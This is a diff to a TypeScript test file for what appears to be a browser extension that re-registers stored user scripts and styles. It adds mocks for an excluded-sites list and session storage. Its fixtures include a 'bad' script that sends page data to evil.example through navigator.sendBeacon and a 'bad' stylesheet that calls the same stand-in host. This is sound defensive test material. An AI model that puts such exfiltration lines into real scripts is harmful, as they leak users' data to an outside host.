@@ -16,6 +16,8 @@ vi.mock('./storage', () => ({
 }))
 // The per-site off list is read at registration; none is turned off here.
 vi.mock('./site-off', () => ({ getOffHosts: async () => [] }))
+// The excluded-sites list is read at registration too (#131); none is set here.
+vi.mock('./excluded-sites', () => ({ getExcludedSites: async () => [] }))
 vi.mock('./userscripts-api', () => ({
   userScripts: {
     unregister: async () => {},
@@ -56,10 +58,24 @@ const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', docum
 const GOOD_CSS = 'aside { display: none }'
 const BAD_CSS = 'a { background: url(https://evil.example/t) }'
 
+const sessionStore = new Map<string, unknown>()
+
 beforeEach(() => {
   registered.length = 0
   settings = { ...DEFAULT_SETTINGS }
-  vi.stubGlobal('browser', { permissions: { contains: async () => true } })
+  sessionStore.clear()
+  vi.stubGlobal('browser', {
+    permissions: { contains: async () => true },
+    // Holds the error tokens that registrations keep in storage.session (#123).
+    storage: {
+      session: {
+        get: async (key: string) => (sessionStore.has(key) ? { [key]: sessionStore.get(key) } : {}),
+        set: async (items: Record<string, unknown>) => {
+          for (const [key, value] of Object.entries(items)) sessionStore.set(key, value)
+        },
+      },
+    },
+  })
 })
 
 describe('re-registering stored JavaScript', () => {
